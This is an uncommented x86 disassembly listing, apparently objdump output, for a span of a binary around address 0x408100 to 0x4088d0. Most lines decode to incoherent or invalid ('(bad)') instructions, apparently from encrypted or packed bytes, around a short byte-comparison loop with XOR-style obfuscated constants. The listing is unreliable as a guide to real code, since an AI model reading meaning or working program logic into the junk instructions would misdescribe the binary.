  408103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408104:	and    edx,DWORD PTR [ebx-0x2b]
  408107:	push   cs
  408108:	jmp    0xaa83:0xd52ad723
  40810f:	xor    cl,ch
  408111:	sub    eax,DWORD PTR [ecx-0x7e648ee7]
  408117:	inc    esp
  408118:	push   eax
  408119:	popa   
  40811a:	or     BYTE PTR ds:[ebp+0x4c],ch
  40811e:	jmp    0x566f7440
  408123:	push   es
  408124:	mov    DWORD PTR gs:[eax+0x3519a5db],eax
  40812b:	popf   
  40812c:	dec    edi
  40812d:	adc    DWORD PTR [esi+0x2ce77e57],edx
  408133:	cmp    eax,0x510ca2de
  408138:	mov    ah,0xe
  40813a:	xlat   BYTE PTR ds:[ebx]
  40813b:	loopne 0x408129
  40813d:	jl     0x4081ac
  40813f:	pop    edi
  408140:	retf   0x2fd0
  408143:	stc    
  408144:	add    eax,0x229208a6
  408149:	xchg   edi,eax
  40814a:	and    eax,0x657d9c69
  40814f:	and    ch,BYTE PTR fs:[edx]
  408152:	shl    ah,1
  408154:	cmp    DWORD PTR [ebx],0x73afd78e
  40815a:	xor    DWORD PTR [edx-0x37],0x51
  40815e:	and    cl,0xa4
  408161:	nop
  408162:	lods   al,BYTE PTR ds:[esi]
  408163:	inc    ecx
  408164:	mov    ds:0x73c50556,al
  408169:	das    
  40816a:	(bad)  
  40816b:	dec    esp
  40816c:	int    0x9f
  40816e:	push   ecx
  40816f:	push   ss
  408170:	jno    0x408152
  408172:	mov    bl,dl
  408174:	(bad)  
  408175:	cld    
  408176:	xor    eax,DWORD PTR [ebx+0x2b]
  408179:	push   esp
  40817a:	cmp    edx,DWORD PTR es:[eax+0x45]
  40817e:	inc    esi
  40817f:	fs inc ecx
  408181:	xor    ch,BYTE PTR [ebp+eiz*8-0x38]
  408185:	imul   ebp,esp,0xb
  408188:	add    eax,0x8cab4fa3
  40818d:	rol    DWORD PTR [edi+0x1c5d9262],cl
  408193:	test   DWORD PTR [ebx],edi
  408195:	mov    DWORD PTR [edi-0x5f],esi
  408198:	loop   0x4081fa
  40819a:	pop    ebp
  40819b:	pop    ebx
  40819c:	sub    cl,BYTE PTR [eax-0x75]
  40819f:	mov    ss,WORD PTR [esi]
  4081a1:	inc    esi
  4081a2:	mov    WORD PTR [ebp+esi*1+0x466ba411],ss
  4081a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081aa:	pusha  
  4081ab:	jle    0x4081ea
  4081ad:	scas   eax,DWORD PTR es:[edi]
  4081ae:	data16 jge 0x4081c5
  4081b1:	or     eax,0xef4c85df
  4081b6:	jo     0x4081dd
  4081b8:	retf   
  4081b9:	pop    ss
  4081ba:	push   0xd9f68ad2
  4081bf:	fptan  
  4081c1:	lahf   
  4081c2:	pop    ebp
  4081c3:	jno    0x40820e
  4081c5:	stos   BYTE PTR es:[edi],al
  4081c6:	pusha  
  4081c7:	push   0x43
  4081c9:	lahf   
  4081ca:	jae    0x40818c
  4081cc:	or     BYTE PTR [edi],bl
  4081ce:	pop    ecx
  4081cf:	popf   
  4081d0:	jg     0x40822f
  4081d2:	pop    ebp
  4081d3:	aas    
  4081d4:	dec    ebx
  4081d5:	imul   esi,DWORD PTR [ebx-0x33b8b98e],0x8004aa1f
  4081df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081e0:	cs mov edx,0x9a862155
  4081e6:	inc    edi
  4081e7:	call   0x6f3d57eb
  4081ec:	jns    0x408212
  4081ee:	lods   al,BYTE PTR ds:[esi]
  4081ef:	(bad)  
  4081f0:	je     0x4081cc
  4081f2:	mov    dl,0xa0
  4081f4:	sub    eax,0x7d0459eb
  4081f9:	sar    BYTE PTR [ebx+eax*1+0x3c],cl
  4081fd:	ins    DWORD PTR es:[edi],dx
  4081fe:	xor    bh,ch
  408200:	xchg   esi,eax
  408201:	(bad)  
  408202:	loopne 0x408215
  408204:	lods   al,BYTE PTR ds:[esi]
  408205:	cs int3 
  408207:	sar    BYTE PTR [eax],cl
  408209:	or     esi,DWORD PTR [esi]
  40820b:	je     0x4081b1
  40820d:	pop    edi
  40820e:	div    BYTE PTR [ecx+0x5c]
  408211:	xchg   esi,eax
  408212:	mov    ecx,esp
  408214:	cld    
  408215:	mov    edx,0xedcc9f42
  40821a:	pop    ecx
  40821b:	xor    eax,DWORD PTR [esi-0x1b]
  40821e:	dec    esi
  40821f:	mov    WORD PTR [edi+0x7a],ss
  408222:	add    BYTE PTR [edi-0x4c],al
  408225:	je     0x4081a7
  408227:	popa   
  408228:	mov    al,ds:0xfbe3bc4e
  40822d:	or     DWORD PTR [ebx+0x72],edi
  408230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408231:	cmp    eax,edx
  408233:	inc    ebp
  408234:	leave  
  408235:	and    BYTE PTR [edi],0xf5
  408238:	aas    
  408239:	(bad)  
  40823a:	mov    bl,0x68
  40823c:	aaa    
  40823d:	mov    WORD PTR [eax+0x5f],cs
  408240:	sbb    ebx,DWORD PTR [ebp+0x6ac94142]
  408246:	cmp    DWORD PTR [esi-0x1617eb8f],esi
  40824c:	fwait
  40824d:	ins    BYTE PTR es:[edi],dx
  40824e:	mov    DWORD PTR [ebx-0x6586587f],ecx
  408254:	xchg   ecx,eax
  408255:	dec    edi
  408256:	sub    ch,BYTE PTR [ecx-0x64b5dd1e]
  40825c:	sub    al,0x92
  40825e:	(bad)  
  40825f:	xchg   ebp,eax
  408260:	and    ebp,DWORD PTR [ebp+0x2c]
  408263:	mov    al,BYTE PTR [ebp+0x78]
  408266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408267:	leave  
  408268:	bndstx [esi-0x35],bnd1
  40826c:	cmp    ecx,ecx
  40826e:	mov    ds:0x27ec9ec0,al
  408273:	jbe    0x408225
  408275:	cmp    esi,0x303ae03c
  40827b:	sbb    al,0x8d
  40827d:	daa    
  40827e:	stos   BYTE PTR es:[edi],al
  40827f:	cmp    BYTE PTR [eax-0x2],al
  408282:	or     al,0x6d
  408284:	and    BYTE PTR [eax+edi*8+0x68],ch
  408288:	neg    dl
  40828a:	dec    ecx
  40828b:	fild   DWORD PTR [eax+0x33]
  40828e:	out    0x8d,al
  408290:	pop    ebx
  408291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408292:	stc    
  408293:	mov    ebx,0x61cd050f
  408298:	pop    ds
  408299:	cmp    al,0xba
  40829b:	ds jne 0x408253
  40829e:	mov    dh,0x8a
  4082a0:	adc    ebp,ebp
  4082a2:	and    eax,0x24fc40c9
  4082a7:	stc    
  4082a8:	scas   al,BYTE PTR es:[edi]
  4082a9:	or     ebx,DWORD PTR [eax]
  4082ab:	(bad)  [eax-0x67]
  4082ae:	sbb    esi,DWORD PTR [edx+0x1559571d]
  4082b4:	ret    
  4082b5:	jo     0x4082cd
  4082b7:	sar    BYTE PTR [edx-0x56a86e47],1
  4082bd:	mov    al,0x10
  4082bf:	(bad)  
  4082c0:	sub    ah,dl
  4082c2:	int    0x5c
  4082c4:	scas   eax,DWORD PTR es:[edi]
  4082c5:	cmp    bh,BYTE PTR [ebp-0x33]
  4082c8:	push   esi
  4082c9:	jl     0x408343
  4082cb:	mov    edx,0x34d11af1
  4082d0:	push   edx
  4082d1:	loop   0x4082a6
  4082d3:	fcomp  QWORD PTR [edi-0x38cf084c]
  4082d9:	dec    ebp
  4082da:	inc    eax
  4082db:	jp     0x408263
  4082dd:	pop    esp
  4082de:	aas    
  4082df:	mov    dl,0x72
  4082e1:	mov    cs,ebx
  4082e3:	es jns 0x4082d3
  4082e6:	xchg   BYTE PTR [ecx],ch
  4082e8:	add    eax,0x6371cd12
  4082ed:	or     edx,edi
  4082ef:	idiv   ebp
  4082f1:	pop    esp
  4082f2:	mov    ah,0xcf
  4082f4:	imul   edi,DWORD PTR [esi+ebx*2+0x5dcc3822],0xe4caa42b
  4082ff:	dec    eax
  408300:	and    edx,ecx
  408302:	mov    dh,0x3f
  408304:	adc    DWORD PTR [edi-0x75],edi
  408307:	push   cs
  408308:	test   DWORD PTR ds:0x364c3360,esp
  40830e:	push   0xffffffd9
  408310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408311:	hlt    
  408312:	(bad)  
  408313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408314:	xor    al,0x71
  408316:	add    esi,edx
  408318:	pop    ebp
  408319:	adc    DWORD PTR [ebp+0x66057706],edx
  40831f:	(bad)  
  408320:	scas   eax,DWORD PTR es:[edi]
  408321:	cld    
  408322:	xor    DWORD PTR [edi+0x38],edx
  408325:	jne    0x408304
  408327:	push   eax
  408328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408329:	jb     0x408345
  40832b:	imul   ebx,DWORD PTR [eax+0x45782750],0xffffffb5
  408332:	mov    eax,esi
  408334:	push   cs
  408335:	adc    dl,0x1
  408338:	and    BYTE PTR [esi-0x28],0x61
  40833c:	scas   al,BYTE PTR es:[edi]
  40833d:	dec    esp
  40833e:	adc    ebp,edx
  408340:	aaa    
  408341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408342:	aaa    
  408343:	xchg   edi,eax
  408344:	lods   al,BYTE PTR ds:[esi]
  408345:	push   eax
  408346:	push   cs
  408347:	(bad)  
  408348:	call   0xd4860c54
  40834d:	mov    edx,fs
  40834f:	mov    al,ds:0x330d14c2
  408354:	stos   BYTE PTR es:[edi],al
  408355:	clc    
  408356:	mov    dl,dh
  408358:	mov    cl,0xe0
  40835a:	js     0x4082e0
  40835c:	daa    
  40835d:	push   ebp
  40835e:	mov    al,0x9f
  408360:	pusha  
  408361:	idiv   DWORD PTR [edi]
  408363:	mov    ds:0xad6ae3bf,eax
  408368:	cmp    ebx,DWORD PTR [esi+0x4ad6e874]
  40836e:	jp     0x40832a
  408370:	sbb    ecx,edi
  408372:	(bad)  
  408374:	repnz inc edx
  408376:	mov    ebp,0x6afd4862
  40837b:	outs   dx,BYTE PTR ds:[esi]
  40837c:	ins    DWORD PTR es:[edi],dx
  40837d:	pop    es
  40837e:	loope  0x4083b9
  408380:	cmp    eax,0x919ce9d3
  408385:	inc    ebx
  408386:	sub    eax,0x33183bb4
  40838b:	repnz sub DWORD PTR [edi+0x3280c73b],ebp
  408392:	pushf  
  408393:	int3   
  408394:	mov    ebx,0xa5bde262
  408399:	jg     0x40837b
  40839b:	pop    ebp
  40839c:	jl     0x4083a4
  40839e:	adc    ecx,eax
  4083a0:	loopne 0x4083c2
  4083a2:	inc    ecx
  4083a3:	es mov dl,0xf3
  4083a6:	or     DWORD PTR ds:0x3e80a5ed,esp
  4083ac:	dec    BYTE PTR [ebx]
  4083ae:	push   cs
  4083af:	jno    0x4083a7
  4083b1:	jp     0x408381
  4083b3:	pop    es
  4083b4:	mov    al,ds:0xf0d57c11
  4083b9:	imul   ebp,DWORD PTR [ebp-0x32a5bdba],0x35
  4083c0:	sub    BYTE PTR [edx],dl
  4083c2:	cwde   
  4083c3:	add    eax,0x76c57994
  4083c8:	in     al,dx
  4083c9:	lods   al,BYTE PTR ds:[esi]
  4083ca:	push   ss
  4083cb:	pop    ds
  4083cc:	adc    ah,cl
  4083ce:	xchg   bh,ah
  4083d0:	adc    al,0x4
  4083d2:	xlat   BYTE PTR ds:[ebx]
  4083d3:	cmp    al,BYTE PTR [ebx+0x28]
  4083d6:	iret   
  4083d7:	repnz and DWORD PTR [edi],edi
  4083da:	mov    al,BYTE PTR [eax]
  4083dc:	add    bh,dl
  4083de:	retf   
  4083df:	test   esp,0xdffefcb8
  4083e5:	loopne 0x40838c
  4083e7:	into   
  4083e8:	dec    esi
  4083e9:	adc    bl,BYTE PTR [edi+ebp*2]
  4083ec:	lods   eax,DWORD PTR ds:[esi]
  4083ed:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4083f1:	mov    dl,BYTE PTR [ebp-0x1]
  4083f4:	cmp    al,dl
  4083f6:	je     0x408742
  4083fc:	mov    eax,DWORD PTR [ebp+0x8]
  4083ff:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408403:	mov    edx,DWORD PTR [ebp+0xc]
  408406:	cmp    al,BYTE PTR [edx]
  408408:	jne    0x408a71
  40840e:	mov    eax,DWORD PTR [ebp-0x8]
  408411:	mov    edx,DWORD PTR [ebp+0xc]
  408414:	movsx  edx,BYTE PTR [edx]
  408417:	xor    eax,ecx
  408419:	add    eax,esi
  40841b:	cmp    edx,eax
  40841d:	je     0x40875c
  408423:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  40842a:	jmp    0x408733
  40842f:	cmp    al,0xc8
  408431:	rcl    dl,0xd4
  408434:	fcmovu st,st(2)
  408436:	into   
  408437:	(bad)  
  408438:	leave  
  408439:	xchg   BYTE PTR [edi-0x617ff1e0],dl
  40843f:	loopne 0x408423
  408441:	js     0x4084bb
  408443:	fs jle 0x4084be
  408446:	js     0x408410
  408448:	test   eax,ebx
  40844a:	out    0xb5,al
  40844c:	and    ebp,DWORD PTR [esi]
  40844e:	lock not BYTE PTR [edx+0x4fbc5eb9]
  408455:	les    eax,FWORD PTR [edi]
  408457:	pop    es
  408458:	xchg   edi,eax
  408459:	jbe    0x408450
  40845b:	mov    bh,0xd8
  40845d:	adc    ah,dl
  40845f:	or     DWORD PTR [ebp-0x6390961d],0xffffffac
  408466:	inc    DWORD PTR [ecx]
  408468:	scas   eax,DWORD PTR es:[edi]
  408469:	push   ebx
  40846a:	add    edi,esi
  40846c:	rcr    DWORD PTR [eax],1
  40846e:	add    BYTE PTR [ecx+0x4],bh
  408471:	ja     0x40840a
  408473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408474:	test   BYTE PTR [eax-0x16],0x4c
  408478:	das    
  408479:	fldenv [ebx-0xe7c44a5]
  40847f:	test   BYTE PTR [esi+ecx*8+0x305155a],bl
  408486:	gs cmp al,0x39
  408489:	adc    al,0xb9
  40848b:	xchg   BYTE PTR [ebp+0x50ade6b1],ch
  408491:	cmp    esi,ebp
  408493:	inc    esp
  408494:	(bad)  
  408495:	hlt    
  408496:	aad    0x23
  408498:	jmp    0xaac6:0xb29e33e6
  40849f:	jg     0x408489
  4084a1:	sub    DWORD PTR [ecx+eiz*1],0xc0055237
  4084a8:	ss push ds
  4084aa:	cmp    al,0x72
  4084ac:	ret    0x70c
  4084af:	ins    DWORD PTR es:[edi],dx
  4084b0:	rol    BYTE PTR [esi-0xb6e469f],cl
  4084b6:	adc    al,0xfe
  4084b8:	pushf  
  4084b9:	sbb    DWORD PTR [edi+0x13c0b258],eax
  4084bf:	(bad)  
  4084c0:	into   
  4084c1:	or     dl,BYTE PTR [ebx+0x16]
  4084c4:	aad    0xd1
  4084c6:	pop    ecx
  4084c7:	push   esp
  4084c8:	sub    eax,0x94584a9c
  4084cd:	int3   
  4084ce:	ds mov ch,0xb8
  4084d1:	int3   
  4084d2:	sbb    dh,al
  4084d4:	push   0xffffffab
  4084d6:	sub    bh,al
  4084d8:	mov    ch,0x80
  4084da:	jne    0x4084ca
  4084dc:	jmp    0x40a4eaa3
  4084e1:	lahf   
  4084e2:	repnz add BYTE PTR [esi],bh
  4084e5:	pop    ebx
  4084e6:	inc    ebp
  4084e7:	and    BYTE PTR [ecx-0x28ca4c6d],bh
  4084ed:	mov    esi,DWORD PTR [ecx-0x5f0c07aa]
  4084f3:	cli    
  4084f4:	ins    BYTE PTR es:[edi],dx
  4084f5:	cvtps2pd xmm2,xmm7
  4084f8:	imul   ecx,DWORD PTR [eax+0xa43508d],0x8161ffc7
  408502:	push   ds
  408503:	idiv   BYTE PTR ds:0x5704fb72
  408509:	xor    eax,0xfa2319e7
  40850e:	aam    0xd8
  408510:	push   ecx
  408511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408512:	push   edi
  408513:	das    
  408514:	jae    0x4084af
  408516:	in     eax,0x31
  408518:	jne    0x4084a9
  40851a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40851b:	mov    BYTE PTR [edx+edx*2],ah
  40851e:	xchg   esi,eax
  40851f:	mov    al,ds:0x8dae14d4
  408524:	bound  eax,QWORD PTR [ecx+0x57]
  408527:	repz mov eax,ds:0xaffd5582
  40852d:	sub    ch,bh
  40852f:	pop    ecx
  408530:	pusha  
  408531:	rol    DWORD PTR [edx],1
  408533:	int3   
  408534:	or     DWORD PTR [edi+0x58],eax
  408537:	retf   0x73e6
  40853a:	xchg   ecx,eax
  40853b:	jmp    0x4084ce
  40853d:	aas    
  40853e:	mov    WORD PTR [edx-0x30393c3f],es
  408544:	or     esp,DWORD PTR [ebp-0x2c]
  408547:	(bad)  
  408549:	mov    DWORD PTR [ecx],eax
  40854b:	mov    ebp,0x97e934f6
  408550:	inc    esp
  408551:	cmc    
  408552:	dec    ebp
  408553:	jns    0x4085b4
  408555:	(bad)  
  408556:	out    dx,eax
  408557:	mov    al,BYTE PTR [ebx]
  408559:	pop    ds
  40855a:	cwde   
  40855b:	fnstcw WORD PTR [edx+0x44a78dfd]
  408561:	repz xchg ecx,eax
  408563:	pop    ds
  408564:	xchg   DWORD PTR [edx-0x26],ebx
  408567:	shl    BYTE PTR [edi],0x9f
  40856a:	adc    eax,0xf60faf0a
  40856f:	push   es
  408570:	lods   al,BYTE PTR ds:[esi]
  408571:	push   eax
  408572:	ret    
  408573:	in     eax,0x74
  408575:	push   esi
  408576:	xchg   edi,eax
  408577:	push   0xe68d8177
  40857c:	aam    0xd0
  40857e:	fistp  QWORD PTR [ebx+0x2725c8f1]
  408584:	jmp    0x37179bc1
  408589:	push   esi
  40858a:	hlt    
  40858b:	scas   eax,DWORD PTR es:[edi]
  40858c:	ss or  eax,0x84833752
  408592:	add    al,0x33
  408594:	add    bl,bh
  408596:	fisub  WORD PTR [edi+0x1fe6e1b7]
  40859c:	adc    ch,bh
  40859e:	bound  edi,QWORD PTR ds:0x51564c7d
  4085a4:	sbb    eax,esp
  4085a6:	and    eax,0xd6567c6d
  4085ab:	jns    0x4085c4
  4085ad:	stos   BYTE PTR es:[edi],al
  4085ae:	mov    DWORD PTR [edx+0x3b],ecx
  4085b1:	jmp    0xff1605d3
  4085b6:	jns    0x4085a0
  4085b8:	mov    esp,0x92d7f475
  4085bd:	test   esi,edx
  4085bf:	(bad)  
  4085c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085c1:	jle    0x408595
  4085c3:	ins    BYTE PTR es:[edi],dx
  4085c4:	jecxz  0x408551
  4085c6:	imul   edx,DWORD PTR [ecx-0x35],0x2902aef8
  4085cd:	sub    BYTE PTR [ebp-0x5b875d6b],ah
  4085d3:	sbb    DWORD PTR [esi],ecx
  4085d5:	retf   
  4085d6:	pop    ebp
  4085d7:	repnz mov dh,0x4b
  4085da:	push   esp
  4085db:	pushf  
  4085dc:	shl    edi,0x60
  4085df:	stc    
  4085e0:	xchg   esi,eax
  4085e1:	inc    edx
  4085e2:	adc    DWORD PTR ds:0x7a551c59,eax
  4085e8:	jl     0x408663
  4085ea:	add    ecx,edi
  4085ec:	jne    0x4085b5
  4085ee:	ret    
  4085ef:	outs   dx,BYTE PTR ds:[esi]
  4085f0:	(bad)  
  4085f1:	pop    edi
  4085f2:	rcl    DWORD PTR [ebp+0x77],cl
  4085f5:	cdq    
  4085f6:	sbb    esp,edi
  4085f8:	or     DWORD PTR [edi-0x7e],0xc33a04db
  4085ff:	stos   BYTE PTR es:[edi],al
  408600:	jbe    0x408659
  408602:	out    dx,eax
  408603:	ss inc edi
  408605:	imul   ebx,DWORD PTR [ebx+edi*1+0x6885d155],0xffffff9e
  40860d:	push   cs
  40860e:	rol    al,1
  408610:	aaa    
  408611:	cmp    eax,0xe3fc63ab
  408616:	gs pop ss
  408618:	pop    esi
  408619:	and    al,0xcf
  40861b:	mov    bl,0x1f
  40861d:	pop    ecx
  40861e:	jmp    0x932fdcdf
  408623:	xor    esi,esi
  408625:	xchg   esi,eax
  408626:	sbb    eax,0x501ac2ff
  40862b:	pushf  
  40862c:	dec    edx
  40862d:	fwait
  40862e:	dec    ebp
  40862f:	pop    ebp
  408630:	call   0x697d:0xb0d84819
  408637:	mov    al,0x93
  408639:	cmp    eax,0x3b6718c5
  40863e:	or     DWORD PTR [esi],0xffffffce
  408641:	sub    bl,BYTE PTR [esi]
  408643:	adc    al,BYTE PTR [edx-0x5a]
  408646:	jae    0x4085d2
  408648:	mov    esp,0x866e3b3e
  40864d:	pop    es
  40864e:	out    dx,al
  40864f:	jne    0x40868d
  408651:	lods   al,BYTE PTR ds:[esi]
  408652:	mov    bl,0xb5
  408654:	pop    es
  408655:	inc    ebx
  408656:	inc    ecx
  408657:	(bad)  
  408658:	loopne 0x40861c
  40865a:	int    0xe4
  40865c:	pop    edi
  40865d:	(bad)  
  40865e:	fdivr  QWORD PTR [edi+0x19]
  408661:	jmp    0x34968110
  408666:	jecxz  0x408695
  408668:	test   BYTE PTR [esi-0x52bffc],dl
  40866e:	js     0x4086cc
  408670:	call   DWORD PTR [eax]
  408672:	sbb    esp,0xffffffd9
  408675:	out    dx,eax
  408676:	sbb    eax,0xcdffc025
  40867b:	loop   0x408652
  40867d:	les    ebp,FWORD PTR [ecx]
  40867f:	sbb    BYTE PTR [ecx+0x0],0x1b
  408683:	shr    DWORD PTR [ebp-0x16],1
  408686:	iret   
  408687:	jns    0x4086ef
  408689:	shr    BYTE PTR [edx],0x29
  40868c:	inc    eax
  40868d:	inc    edx
  40868e:	sub    BYTE PTR [eiz*4+0x6999eeb0],0x79
  408696:	lock add eax,0x47c922bc
  40869c:	mov    al,0x7b
  40869e:	or     DWORD PTR [ebp+0x2a],esp
  4086a1:	jns    0x4086d4
  4086a3:	push   0x46
  4086a5:	and    eax,0x9b01059f
  4086aa:	lock lods al,BYTE PTR ds:[esi]
  4086ac:	stos   DWORD PTR es:[edi],eax
  4086ad:	and    ebx,esi
  4086af:	test   eax,0x4a667629
  4086b4:	inc    edx
  4086b5:	cmp    BYTE PTR [edi],bh
  4086b7:	into   
  4086b8:	dec    eax
  4086b9:	xchg   dl,dh
  4086bb:	test   BYTE PTR [ebx+0x74492c3d],bh
  4086c1:	mov    ch,BYTE PTR [ebx+0x6b3b8d8c]
  4086c7:	mov    al,ds:0x685cdc73
  4086cc:	lods   eax,DWORD PTR ds:[esi]
  4086cd:	xor    eax,0x1da1d93
  4086d2:	push   edx
  4086d3:	mul    DWORD PTR [edi+0x10]
  4086d6:	push   ds
  4086d7:	xchg   ebx,eax
  4086d8:	loopne 0x4086fc
  4086da:	cdq    
  4086db:	inc    ebx
  4086dc:	jnp    0x4086cb
  4086de:	xchg   edi,eax
  4086df:	pusha  
  4086e0:	or     BYTE PTR [ecx],dl
  4086e2:	xor    DWORD PTR ds:[edi+eiz*8+0x40],0xffffff8c
  4086e8:	jle    0x4086c7
  4086ea:	mov    esi,0xfb185dd
  4086ef:	mov    al,ds:0xd0ae2dd0
  4086f4:	js     0x408696
  4086f6:	fs mov ecx,0x9a795867
  4086fc:	pop    esi
  4086fd:	add    al,0x59
  4086ff:	imul   ebx,edx,0x13e7457a
  408705:	xchg   ebp,eax
  408706:	xchg   ecx,eax
  408707:	add    al,0xb4
  408709:	mov    DWORD PTR [edi+0x7056e55c],edx
  40870f:	hlt    
  408710:	push   edx
  408711:	xchg   edi,eax
  408712:	dec    eax
  408713:	push   ebx
  408714:	mov    edx,0xf1a2ec0f
  408719:	rcl    edx,0x59
  40871c:	jle    0x4086e5
  40871e:	mov    ebx,?
  408720:	cmp    BYTE PTR [edi+0x3926887],ah
  408726:	xor    ecx,DWORD PTR [ecx-0x7bd07cf5]
  40872c:	(bad)  
  40872d:	add    BYTE PTR gs:[ebx],0x9c
  408731:	nop
  408732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408733:	lea    eax,[ebp-0x18]
  408736:	mov    DWORD PTR [ebp-0x14],eax
  408739:	mov    eax,DWORD PTR [ebp-0x14]
  40873c:	add    DWORD PTR [eax],0x705fa8e
  408742:	mov    eax,DWORD PTR [ebp-0x10]
  408745:	mov    edx,DWORD PTR [ebp+0x8]
  408748:	xor    eax,ecx
  40874a:	lea    eax,[eax+edx*1+0x327298]
  408751:	mov    DWORD PTR [ebp+0x8],eax
  408754:	inc    DWORD PTR [ebp+0xc]
  408757:	jmp    0x4080e1
  40875c:	mov    eax,DWORD PTR [ebp-0x10]
  40875f:	xor    eax,ecx
  408761:	mov    ecx,DWORD PTR [ebp+0x10]
  408764:	add    eax,esi
  408766:	jmp    0x408a6f
  40876b:	(bad)
  40876e:	aas    
  40876f:	fld    st(3)
  408771:	(bad)  
  408773:	add    edi,DWORD PTR [ebp-0x7e]
  408776:	sahf   
  408777:	push   cs
  408778:	cdq    
  408779:	cwde   
  40877a:	mov    ds:0x7878e7cc,al
  40877f:	fs jle 0x4087fa
  408782:	js     0x4087c2
  408784:	cwde   
  408785:	cmp    al,0x54
  408787:	imul   edx,DWORD PTR [esi],0x48074b13
  40878d:	repz (bad) 
  40878f:	into   
  408790:	xor    ebx,ebx
  408792:	xchg   ebx,eax
  408793:	hlt    
  408794:	and    eax,0x26761fdc
  408799:	mov    al,BYTE PTR [ecx-0x3a]
  40879c:	aas    
  40879d:	sbb    al,0x3f
  40879f:	stc    
  4087a0:	nop
  4087a1:	or     BYTE PTR [ebx],0x7a
  4087a4:	xor    dh,BYTE PTR [ecx+edi*1-0x6998afb0]
  4087ab:	adc    al,0x1a
  4087ad:	inc    ebp
  4087ae:	sbb    esi,DWORD PTR [edi]
  4087b0:	jle    0x408820
  4087b2:	cmp    dh,BYTE PTR [ecx-0x4b8b66a4]
  4087b8:	push   esi
  4087b9:	mov    ah,0xd7
  4087bb:	dec    edx
  4087bc:	iret   
  4087bd:	mov    ecx,0x124efa69
  4087c2:	sub    esi,DWORD PTR [esi+0x78ce2a68]
  4087c8:	ds dec eax
  4087ca:	mov    ecx,0x7e71fc77
  4087cf:	inc    esi
  4087d0:	xchg   ecx,eax
  4087d1:	adc    al,0xbb
  4087d3:	in     al,dx
  4087d4:	mov    ds:0xcbbf57c6,eax
  4087d9:	push   edx
  4087da:	sub    DWORD PTR [ecx-0x7b282e30],eax
  4087e0:	aam    0x87
  4087e2:	pop    ss
  4087e3:	xchg   ebp,esi
  4087e5:	test   DWORD PTR [esi],ebp
  4087e7:	jnp    0x4087a0
  4087e9:	fs leave 
  4087eb:	jp     0x4087b1
  4087ed:	cmp    cl,ch
  4087ef:	sub    ebx,ecx
  4087f1:	loop   0x4087a7
  4087f3:	add    bh,dl
  4087f5:	inc    ebp
  4087f6:	jecxz  0x40882c
  4087f8:	fld    DWORD PTR [edx+ecx*1-0x7d]
  4087fc:	adc    BYTE PTR [ebp+0x10],al
  4087ff:	std    
  408800:	mov    eax,ds:0x7da5de20
  408805:	and    DWORD PTR [ebp+0x6492466b],esp
  40880b:	jmp    0xb7dc:0xa648080e
  408812:	leave  
  408813:	mov    ?,WORD PTR [ebx]
  408815:	jne    0x408840
  408817:	sub    bl,BYTE PTR [ecx+eax*1-0x24]
  40881b:	push   0xffffffe8
  40881d:	inc    edi
  40881e:	fbld   TBYTE PTR [esi-0x7cca45c9]
  408824:	adc    BYTE PTR [esi+0x35c034a6],ah
  40882a:	aam    0x55
  40882c:	mov    cl,0x10
  40882e:	imul   esp,ecx,0x76ba82f5
  408834:	dec    eax
  408835:	jae    0x4087bc
  408837:	jmp    0x4087c9
  408839:	pop    ecx
  40883a:	fidiv  WORD PTR [esp+esi*8]
  40883d:	aad    0xfd
  40883f:	jmp    0xfbfb:0x98785a62
  408846:	hlt    
  408847:	dec    esi
  408848:	shl    ebx,0xc1
  40884b:	mov    bl,0xd6
  40884d:	mov    BYTE PTR [edi+edx*2-0x23c580b8],0x73
  408855:	jno    0x4088c9
  408857:	leave  
  408858:	call   0x87a157e8
  40885d:	xor    al,0x8a
  40885f:	push   ebp
  408860:	lds    eax,FWORD PTR [edx-0x21]
  408863:	jmp    0x408843
  408865:	popa   
  408866:	lahf   
  408867:	mov    dh,BYTE PTR [eax+eiz*4-0x5910d791]
  40886e:	mov    BYTE PTR [ebx+0x6e],al
  408871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408872:	jo     0x4088e5
  408874:	dec    esi
  408875:	inc    edi
  408876:	cmp    eax,0x23f5eb32
  40887b:	jge    0x4088cb
  40887d:	ficomp WORD PTR [eax+0x8]
  408880:	or     DWORD PTR [ecx-0x7fe9c0b3],esi
  408886:	invlpg BYTE PTR [ecx]
  408889:	jo     0x408909
  40888b:	and    DWORD PTR [edi],ebx
  40888d:	lahf   
  40888e:	loopne 0x408892
  408890:	popf   
  408891:	mov    ds:0x524d1673,al
  408896:	adc    eax,0xf79b4008
  40889b:	or     ch,cl
  40889d:	dec    esp
  40889e:	sbb    al,0xea
  4088a0:	add    ebx,DWORD PTR ds:0xd5374ab0
  4088a6:	sbb    al,0x85
  4088a8:	push   es
  4088a9:	(bad)
  4088ad:	mov    esp,0x2a69c94c
  4088b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088b3:	dec    esp
  4088b4:	rol    edi,1
  4088b6:	push   ebx
  4088b7:	clc    
  4088b8:	push   esp
  4088b9:	retf   
  4088ba:	pushf  
  4088bb:	cmp    dl,al
  4088bd:	aas    
  4088be:	add    BYTE PTR [ecx-0x1e],al
  4088c1:	xchg   ecx,eax
  4088c2:	adc    bl,BYTE PTR [edi-0x30]
  4088c5:	cmc    
  4088c6:	pop    ecx
  4088c7:	cmp    al,0x35
  4088c9:	push   ss
  4088ca:	out    0xf9,eax
  4088cc:	mov    cl,0x64
  4088ce:	retf   0xb618
